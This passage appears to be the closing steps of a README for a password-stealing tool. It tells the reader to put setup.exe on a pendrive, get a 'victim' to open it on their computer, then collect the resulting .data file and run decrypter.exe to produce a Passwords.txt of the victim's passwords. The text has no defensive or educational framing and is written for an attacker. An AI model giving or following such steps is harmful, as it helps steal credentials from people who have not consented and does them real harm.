Then copy the **setup.exe** file on your pendrive. And give it to the victim then the victim should somehow need to open **setup.exe** in his computer.
When the victim returns back your pendrive then look for **.data** file and copy the file to the same folder where **decrypter.exe** is present then run the **decrypter.exe**
And a new text file named **Passwords.txt** will appear and open that.
And baam!!! you can see the passwords.
